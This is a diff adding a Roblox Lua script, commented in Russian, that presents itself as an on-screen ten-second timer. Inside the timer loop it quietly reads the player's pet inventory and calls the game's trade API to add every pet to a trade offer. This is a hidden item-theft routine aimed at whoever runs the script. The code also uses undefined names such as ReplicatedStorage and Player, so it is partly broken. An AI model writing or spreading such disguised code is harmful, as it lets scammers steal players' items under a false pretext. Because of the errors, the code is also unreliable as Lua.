@@ -1,1 +1,27 @@
+-- Создаем экранное GUI
+local gui1 = Instance.new("ScreenGui")
+gui1.Parent = game.Players.LocalPlayer.PlayerGui
 
+-- Создаем текстовую метку
+local label1 = Instance.new("TextLabel")
+label1.Parent = gui1
+label1.Size = UDim2.new(0, 100, 0, 100) -- Размер метки
+label1.Position = UDim2.new(0.5, 250, 0.5, 50) -- Позиция метки
+label1.BackgroundColor3 = Color3.new(1, 1, 1) -- Цвет фона метки
+label1.TextColor3 = Color3.new(0, 0, 0) -- Цвет текста метки
+label1.FontSize = Enum.FontSize.Size60 -- Увеличиваем размер шрифта в 4 раза
+
+local timer = 0
+
+for i = 1, 10 do
+    wait(1)
+    timer = timer + 1
+label1.Text = (tostring(timer))
+
+print(timer) -- выводит количество выполненных циклов (в данном случае 10)
+for i, v in pairs(require(ReplicatedStorage.ClientModules.Core.ClientData).get_data()[Player.Name].inventory.pets) do
+ 
+ ReplicatedStorage.API:FindFirstChild("TradeAPI/AddItemToOffer"):FireServer(v.unique)
+ 
+ end
+end
